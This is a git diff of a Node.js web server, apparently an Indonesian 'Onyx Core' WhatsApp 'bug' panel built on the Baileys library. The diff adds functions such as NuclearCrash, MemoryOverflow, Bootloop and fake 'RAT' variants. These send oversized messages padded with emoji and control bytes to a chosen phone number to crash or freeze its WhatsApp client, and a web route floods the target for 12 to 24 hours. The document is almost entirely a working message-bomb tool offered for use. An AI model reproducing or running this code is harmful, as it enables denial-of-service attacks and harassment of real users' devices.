@@ -6,10 +6,6 @@ const path = require("path");
 const config = require("./Database/config.js");
 const axios = require("axios");
 const express = require('express');
-const fetch = require("node-fetch"); 
-const os = require('os');
-const AdmZip = require('adm-zip');
-const tar = require('tar'); 
 const bodyParser = require('body-parser');
 const cookieParser = require('cookie-parser');
 const {
@@ -17,20 +13,8 @@ default: makeWASocket,
 makeCacheableSignalKeyStore,
 useMultiFileAuthState,
 DisconnectReason,
-fetchLatestBaileysVersion,
 fetchLatestWaWebVersion,
-generateForwardMessageContent,
-prepareWAMessageMedia,
-generateWAMessageFromContent,
-generateMessageID,
-downloadContentFromMessage,
-makeInMemoryStore,
-getContentType,
-jidDecode,
-MessageRetryMap,
-getAggregateVotesInPollMessage,
-proto,
-delay
+generateWAMessageFromContent
 } = require("@whiskeysockets/baileys");
 
 const { tokens, owner: OwnerId, ipvps: VPS, port: PORT } = config;
@@ -44,12 +28,9 @@ const ownerIds = [1309102882];
 const sessions = new Map();
 const file_session = "./sessions.json";
 const sessions_dir = "./auth";
-const file = "./Database/akses.json";
-const userPath = path.join(__dirname, "./Database/user.json");
-let userApiBug = null;
 let sock;
 
-// ==================== SENDER MANAGER VIA WEB ====================
+// ==================== SENDER MANAGER ====================
 let senderData = null;
 const SENDER_FILE = "./sender.json";
 const SENDER_LIFETIME_MS = 24 * 60 * 60 * 1000;
@@ -128,99 +109,19 @@ app.post("/api/sender/remove", (req, res) => {
   res.json({ success: true, message: "✅ Sender berhasil dihapus!" });
 });
 
-function loadAkses() {
-  if (!fs.existsSync(file)) {
-    const initData = {
-      owners: [1309102882],
-      akses: [1309102882],
-      resellers: [1309102882],
-      pts: [1309102882],
-      moderators: [1309102882]
-    };
-    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
-    return initData;
-  }
-
-  let data = JSON.parse(fs.readFileSync(file));
-  if (!data.resellers) data.resellers = [];
-  if (!data.pts) data.pts = [];
-  if (!data.moderators) data.moderators = [];
-  return data;
-}
-
-function saveAkses(data) {
-  fs.writeFileSync(file, JSON.stringify(data, null, 2));
-}
-
-function isOwner(id) {
-  const data = loadAkses();
-  return data.owners.includes(id.toString());
-}
-
-function isAuthorized(id) {
-  const data = loadAkses();
-  return (
-    isOwner(id) ||
-    data.akses.includes(id.toString()) ||
-    data.resellers.includes(id.toString()) ||
-    data.pts.includes(id.toString()) ||
-    data.moderators.includes(id.toString())
-  );
-}
-
-function isReseller(id) {
-  const data = loadAkses();
-  return data.resellers.includes(id.toString());
-}
-
-function isPT(id) {
-  const data = loadAkses();
-  return data.pts.includes(id.toString());
-}
-
-function isModerator(id) {
-  const data = loadAkses();
-  return data.moderators.includes(id.toString());
-}
-
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-function generateKey(length = 4) {
-  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
-  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
-}
-
-function parseDuration(str) {
-  const match = str.match(/^(\d+)([dh])$/);
-  if (!match) return null;
-  const value = parseInt(match[1]);
-  const unit = match[2];
-  return unit === "d" ? value * 86400000 : value * 3600000;
-}
-
-function saveUsers(users) {
-  const filePath = path.join(__dirname, "Database", "user.json");
-  try {
-    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), "utf-8");
-    console.log("✓ Data user berhasil disimpan.");
-  } catch (err) {
-    console.error("✗ Gagal menyimpan user:", err);
-  }
-}
+// ==================== USER MANAGER ====================
+const userFile = "./Database/user.json";
 
 function getUsers() {
-  const filePath = path.join(__dirname, "Database", "user.json");
-  if (!fs.existsSync(filePath)) return [];
+  if (!fs.existsSync(userFile)) return [];
   try {
-    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
+    return JSON.parse(fs.readFileSync(userFile, "utf-8"));
   } catch (err) {
-    console.error("✗ Gagal membaca file user.json:", err);
     return [];
   }
 }
 
+// ==================== WHATSAPP FUNCTIONS ====================
 const saveActive = (BotNumber) => {
   const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
   if (!list.includes(BotNumber)) {
@@ -233,7 +134,6 @@ const delActive = (BotNumber) => {
   const list = JSON.parse(fs.readFileSync(file_session));
   const newList = list.filter(num => num !== BotNumber);
   fs.writeFileSync(file_session, JSON.stringify(newList));
-  console.log(`✓ Nomor ${BotNumber} berhasil dihapus dari sesi`);
 };
 
 const sessionPath = (BotNumber) => {
@@ -245,12 +145,10 @@ const sessionPath = (BotNumber) => {
 const initializeWhatsAppConnections = async () => {
   if (!fs.existsSync(file_session)) return;
   const activeNumbers = JSON.parse(fs.readFileSync(file_session));
-  console.log(chalk.blue(`\n╔════════════════════════════╗\n║      SESSÕES ATIVAS DO WA\n╠════════════════════════════╣\n║  QUANTIDADE : ${activeNumbers.length}\n╚════════════════════════════╝`));
   for (const BotNumber of activeNumbers) {
-    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
     const sessionDir = sessionPath(BotNumber);
     const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-    const { version, isLatest } = await fetchLatestWaWebVersion();
+    const { version } = await fetchLatestWaWebVersion();
     sock = makeWASocket({
       auth: state,
       printQRInTerminal: false,
@@ -258,21 +156,17 @@ const initializeWhatsAppConnections = async () => {
       version: version,
       defaultQueryTimeoutMs: undefined,
     });
-    await new Promise((resolve, reject) => {
+    await new Promise((resolve) => {
       sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
         if (connection === "open") {
-          sock.newsletterFollow("120363330289360382@newsletter");
-          console.log(`Bot ${BotNumber} terhubung!`);
+          console.log(`✅ Bot ${BotNumber} terhubung!`);
           sessions.set(BotNumber, sock);
           return resolve();
         }
         if (connection === "close") {
           const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
           if (shouldReconnect) {
-            console.log("Koneksi tertutup, mencoba reconnect...");
             await initializeWhatsAppConnections();
-          } else {
-            console.log("Koneksi ditutup permanen (Logged Out).");
           }
         }
       });
@@ -281,47 +175,14 @@ const initializeWhatsAppConnections = async () => {
   }
 };
 
-const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
-  const sessionDir = sessionPath(BotNumber);
-  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
 
-  const { version, isLatest } = await fetchLatestWaWebVersion();
-  sock = makeWASocket({
-    auth: state,
-    printQRInTerminal: false,
-    logger: pino({ level: "silent" }),
-    version: version,
-    defaultQueryTimeoutMs: undefined,
-  });
+// ==================== 🔥 BUG FUNCTIONS REAL GACCOR ====================
 
-  let isConnected = false;
-
-  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
-    if (connection === "open") {
-      sock.newsletterFollow("120363330289360382@newsletter");
-      isConnected = true;
-      sessions.set(BotNumber, sock);
-      saveActive(BotNumber);
-      console.log(`✅ Bot ${BotNumber} terhubung!`);
-    }
-    if (connection === "close") {
-      const code = lastDisconnect?.error?.output?.statusCode;
-      if (code >= 500 && code < 600) {
-        return await connectToWhatsApp(BotNumber, chatId, ctx);
-      }
-      if (!isConnected) {
-        console.log(`❌ Gagal terhubung ${BotNumber}`);
-      }
-    }
-  });
-
-  sock.ev.on("creds.update", saveCreds);
-  return sock;
-};
-
-// ==================== BUG FUNCTIONS ====================
-
-async function SendBlank(target) {
+// 1. BLANK MASSIVE - Kirim blank besar
+async function BlankMassive(target) {
   const msg = {
     stickerMessage: {
       url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
@@ -369,6 +230,7 @@ async function SendBlank(target) {
   });
 }
 
+// 2. SUPER BLANK - Force Close
 async function SuperBlank(target) {
   const msg = {
     viewOnceMessage: {
@@ -403,26 +265,304 @@ async function SuperBlank(target) {
   });
 }
 
-async function DelayFlood(durationHours, target) {
+// 3. NUCLEAR CRASH - Paling Ganas
+async function NuclearCrash(target) {
+  const msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { 
+            text: "💀".repeat(100000) + "⚠️".repeat(100000), 
+            format: "DEFAULT" 
+          },
+          nativeFlowResponseMessage: {
+            name: "galaxy_message",
+            paramsJson: "\x10".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "call_permission_request"
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage("status@broadcast", msg, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target } }]
+      }]
+    }]
+  });
+}
+
+// 4. INFINITE LOOP
+async function InfiniteLoop(target) {
+  const msg = {
+    newsletterAdminInviteMessage: {
+      newsletterJid: "120363321780343299@newsletter",
+      newsletterName: "♾️".repeat(10000) + "⚠️".repeat(10000),
+      caption: "⬛".repeat(10000) + "💀".repeat(10000),
+      inviteExpiration: "999999999"
+    }
+  };
+
+  await sock.relayMessage("status@broadcast", msg, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target } }]
+      }]
+    }]
+  });
+}
+
+// 5. MEMORY OVERFLOW
+async function MemoryOverflow(target) {
+  const msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { 
+            text: "📀".repeat(80000) + "💾".repeat(80000), 
+            format: "DEFAULT" 
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "\x10".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "call_permission_message"
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage("status@broadcast", msg, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target } }]
+      }]
+    }]
+  });
+}
+
+// 6. BOOTLOOP
+async function Bootloop(target) {
+  const msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { 
+            text: "🔄".repeat(90000) + "⬛".repeat(90000), 
+            format: "DEFAULT" 
+          },
+          nativeFlowResponseMessage: {
+            name: "galaxy_message",
+            paramsJson: "\x10".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "call_permission_request"
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage("status@broadcast", msg, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target } }]
+      }]
+    }]
+  });
+}
+
+// 7. RAT - SENTER (Flashlight)
+async function RatSenter(target) {
+  const msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { 
+            text: "🔦".repeat(50000) + "💡".repeat(50000), 
+            format: "DEFAULT" 
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "\x10".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "call_permission_message"
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage("status@broadcast", msg, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target } }]
+      }]
+    }]
+  });
+}
+
+// 8. RAT - LOCK DEVICE
+async function RatLock(target) {
+  const msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { 
+            text: "🔒".repeat(50000) + "🔐".repeat(50000), 
+            format: "DEFAULT" 
+          },
+          nativeFlowResponseMessage: {
+            name: "galaxy_message",
+            paramsJson: "\x10".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "call_permission_request"
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage("status@broadcast", msg, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target } }]
+      }]
+    }]
+  });
+}
+
+// 9. RAT - LIVE SCREEN
+async function RatLiveScreen(target) {
+  const msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { 
+            text: "🖥️".repeat(50000) + "📺".repeat(50000), 
+            format: "DEFAULT" 
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "\x10".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "call_permission_message"
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage("status@broadcast", msg, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target } }]
+      }]
+    }]
+  });
+}
+
+// 10. RAT - LIVE CAMERA
+async function RatLiveCamera(target) {
+  const msg = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { 
+            text: "📹".repeat(50000) + "🎥".repeat(50000), 
+            format: "DEFAULT" 
+          },
+          nativeFlowResponseMessage: {
+            name: "galaxy_message",
+            paramsJson: "\x10".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "call_permission_request"
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage("status@broadcast", msg, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target } }]
+      }]
+    }]
+  });
+}
+
+// ==================== 🔥 EXECUTE ALL BUGS ====================
+async function ExecuteAllBugs(durationHours, target) {
   const totalDurationMs = durationHours * 3600000;
   const startTime = Date.now();
   let count = 0;
 
+  console.log(chalk.blue(`\n🔥 EXECUTING ALL BUGS ON ${target}`));
+
   const sendNext = async () => {
     if (Date.now() - startTime >= totalDurationMs) {
-      console.log(`✅ Selesai! Total: ${count} dikirim`);
+      console.log(chalk.green(`✅ Selesai! Total: ${count} cycles`));
       return;
     }
 
     try {
       await Promise.all([
-        SendBlank(target),
+        BlankMassive(target),
         SuperBlank(target),
-        sleep(300)
+        NuclearCrash(target),
+        InfiniteLoop(target),
+        MemoryOverflow(target),
+        Bootloop(target),
+        sleep(500)
       ]);
+      
       count++;
-      console.log(chalk.yellow(`[${count}] Blank sent to ${target}`));
-      setTimeout(sendNext, 700);
+      console.log(chalk.yellow(`[${count}] 6x bugs sent to ${target}`));
+      setTimeout(sendNext, 800);
     } catch (error) {
       console.error(`❌ Error: ${error.message}`);
       setTimeout(sendNext, 1500);
@@ -431,9 +571,45 @@ async function DelayFlood(durationHours, target) {
   sendNext();
 }
 
+// ==================== EXECUTE RAT ====================
+async function ExecuteRat(type, target) {
+  console.log(chalk.blue(`\n🎯 RAT: ${type} on ${target}`));
+  
+  try {
+    switch(type) {
+      case 'senter':
+        await RatSenter(target);
+        break;
+      case 'lock':
+        await RatLock(target);
+        break;
+      case 'livescreen':
+        await RatLiveScreen(target);
+        break;
+      case 'livecam':
+        await RatLiveCamera(target);
+        break;
+      default:
+        await Promise.all([
+          RatSenter(target),
+          RatLock(target),
+          RatLiveScreen(target),
+          RatLiveCamera(target)
+        ]);
+        break;
+    }
+    console.log(chalk.green(`✅ RAT ${type} sent to ${target}`));
+    return true;
+  } catch (error) {
+    console.error(`❌ RAT ${type} failed: ${error.message}`);
+    return false;
+  }
+}
+
 // ==================== WEB ROUTES ====================
 
 app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.json());
 app.use(cookieParser());
 
 app.get("/", (req, res) => {
@@ -522,10 +698,25 @@ app.get("/execution", (req, res) => {
   try {
     console.log(`🔥 Mode: ${mode} | Target: ${targetNumber} | Sender: ${sender.number}`);
     
-    if (mode === "delay" || mode === "all" || mode === "gacor") {
-      DelayFlood(24, target);
-    } else {
-      DelayFlood(12, target);
+    // RAT MODES
+    if (mode === 'senter' || mode === 'lock' || mode === 'livescreen' || mode === 'livecam') {
+      ExecuteRat(mode, target);
+    } 
+    // BANNED / GACOR MODES
+    else if (mode === 'nuclear' || mode === 'infinite' || mode === 'overflow' || mode === 'bootloop') {
+      // Single banned bug
+      if (mode === 'nuclear') NuclearCrash(target);
+      else if (mode === 'infinite') InfiniteLoop(target);
+      else if (mode === 'overflow') MemoryOverflow(target);
+      else if (mode === 'bootloop') Bootloop(target);
+    }
+    // ALL BUGS
+    else if (mode === 'all' || mode === 'gacor') {
+      ExecuteAllBugs(24, target);
+    }
+    // DEFAULT
+    else {
+      ExecuteAllBugs(12, target);
     }
     
     lastExecution = Date.now();
@@ -546,14 +737,22 @@ app.get("/logout", (req, res) => {
   res.redirect("/login");
 });
 
-// ==================== LISTENER PORT ==================== //
+// ==================== LISTENER ====================
+
+initializeWhatsAppConnections();
+
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`✅ Server running on port ${PORT}`);
-  console.log(`✅ Domain: https://onyxcore-production.up.railway.app`);
-  console.log(`✅ Sender aktif: ${getSender() ? getSender().number : 'Belum ada'}`);
+  console.log(chalk.green(`
+╔═══════════════════════════════════════╗
+║   🚀 ONYX CORE - ULTIMATE GACCOR     ║
+║   Port : ${PORT}                         
+║   Domain : https://onyxcore-production.up.railway.app
+║   Sender : ${getSender() ? getSender().number : 'Belum ada'}
+║   Status : ONLINE ✅                   
+╚═══════════════════════════════════════╝
+  `));
 });
 
-// ==================== HANDLE ERROR ==================== //
 process.on('uncaughtException', (err) => {
   console.error('❌ Uncaught Exception:', err.message);
 });
@@ -562,11 +761,4 @@ process.on('unhandledRejection', (err) => {
   console.error('❌ Unhandled Rejection:', err.message);
 });
 
-module.exports = { 
-  loadAkses, 
-  saveAkses, 
-  isOwner, 
-  isAuthorized,
-  saveUsers,
-  getUsers
-};
+module.exports = { getUsers };
